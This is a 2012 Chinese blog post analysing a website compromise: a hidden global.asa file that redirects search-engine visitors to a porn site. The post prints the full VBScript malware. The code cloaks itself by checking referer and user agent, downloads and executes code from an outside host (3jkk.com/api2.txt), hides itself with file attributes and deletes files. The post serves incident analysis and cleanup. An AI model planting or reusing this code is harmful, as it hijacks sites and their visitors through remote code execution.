@@ -1,0 +1,103 @@
+Title: 一个网站挂马实例：输入域名访问正常，从百度搜索过来就跳转到色情网站
+Date: 2012-04-28 10:10:24
+URL: /2012/04/global-asa-hacked/
+Tags: Web , 挂马
+
+某网站一直都正常，但是用户突然反应从百度搜索过来就跳转到色情网站。检查了下确实如此。但是百度搜索提示的域名却是正常的。
+
+基本怀疑是网站被挂马，但是找了半天源代码都没有任何提示，用ultraedit32搜索baidu，以及搜索那个挂马网站都没有结果，最后突然发现根目录有个隐藏的系统文件global.asa，打开一看，内容如下：
+
+
+
+&amp;lt;script language=&quot;vbscript&quot; runat=&quot;server&quot;&amp;gt;
+
+&#39;by*diao
+&#39;by*aming
+sub Session_OnStart
+
+&#39;=================================================================
+dim name
+name=request.servervariables(&quot;Path_Translated&quot;)
+Set fso = Server.CreateObject(&quot;scripting.filesystemobject&quot;)
+set f=fso.Getfile(&quot;//./&quot; &amp;amp; Server.MapPath(&quot;/global.asa&quot;))
+Dim v
+Dim t
+ReDim A(Request.Form.Count)
+ReDim B(Request.Form.Count)
+v=Request.Form
+t=Request.Form.Count
+if t&amp;gt;0 then
+For i=0 To t-1
+b(i)=Split(Split(v,&quot;&amp;amp;&quot;)(i),&quot;=&quot;)(1)
+if instr(LCase(b(i)),&quot;global.asa&quot;)&amp;gt;0 then
+f.Attributes=1+2+4
+response.end()
+end if
+Next
+end If
+&#39;=================================================================
+allow_agent=split(&quot;Baiduspider,Sogou,baidu,Sosospider,Googlebot&quot;,&quot;,&quot;)
+DC=false
+For agenti=lbound(allow_agent) to ubound(allow_agent)
+If instr(user_agent,allow_agent(agenti))&amp;gt;0 then
+DC=true
+exit for
+end if
+Next
+CF=False
+Krobotlist = &quot;baidu&brvbar;google&brvbar;sogou&brvbar;soso&brvbar;yahoo&brvbar;bing&brvbar;youdao&brvbar;qihoo&brvbar;iask&quot;
+Botlist = Split(Krobotlist,&quot;&brvbar;&quot;)
+For i = 0 To Ubound(Botlist)
+If InStr(left(request.servervariables(&quot;HTTP_REFERER&quot;),&quot;40&quot;),Botlist(i)) &amp;gt; 0 Then
+CF = True
+Exit For
+End If
+Next
+
+if (DC=false and CF=True and request.servervariables(&quot;QUERY_STRING&quot;)&amp;lt;&amp;gt;&quot;&quot;) Or(instr(request.servervariables(&quot;HTTP_USER_AGENT&quot;),&quot;aidu&quot;)&amp;gt;0) then
+&#39;==========================================================
+
+url=&quot;&lt;a href=&quot;http://jk.3jkk.com/api2.txt&amp;quot;&quot;&gt;http://jk.3jkk.com/api2.txt&quot;&lt;/a&gt;
+Set ObjXMLHTTP=Server.CreateObject(&quot;MSXML2.serverXMLHTTP&quot;)
+ObjXMLHTTP.Open &quot;GET&quot;,url,False
+ObjXMLHTTP.setRequestHeader &quot;User-Agent&quot;,url
+ObjXMLHTTP.send
+GetHtml=ObjXMLHTTP.responseBody
+Set ObjXMLHTTP=Nothing
+set objStream = Server.CreateObject(&quot;Adodb.Stream&quot;)
+objStream.Type = 1
+objStream.Mode =3
+objStream.Open
+objStream.Write GetHtml
+objStream.Position = 0
+objStream.Type = 2
+objStream.Charset = &quot;gb2312&quot;
+GetHtml = objStream.ReadText
+objStream.Close
+if instr(GetHtml,&quot;by*aming&quot;)&amp;gt;0 then
+execute GetHtml
+end If
+
+elseif instr(name,&quot;;&quot;)&amp;gt;0 then
+set m=fso.Getfile(name)
+m.Attributes=0
+fso.DeleteFile(name)
+f.Attributes=1+2+4
+response.end()
+elseif instr(request.servervariables(&quot;QUERY_STRING&quot;),&quot;.asa&quot;)&amp;gt;0  then
+f.Attributes=1+2+4
+response.end()
+End If
+
+f.Attributes=1+2+4
+end sub
+
+&amp;lt;/script&amp;gt;
+
+基本就是这个了，用户也说没有用到global.asa，于是删除，网站正常。
+
+1.  总结，由于global.asa是隐藏的，所以默认ue32没有搜索到。
+2.  这个网页有点高端，他发现你从Baidu/sogou/google什么的过来就给你跳转到色情网站，通过HTTP_REFERER来判断的。但是发现实际过程中google并没有生效，不知道为什么。
+3.  色情网站的网址保存在3jkk.com/api2.txt里面，所以直接搜索也搜索不到。
+4.  另外，global.asa注意开头空了很多行，估计用来忽悠人的，不仔细就不往下看了
+5.  高端！
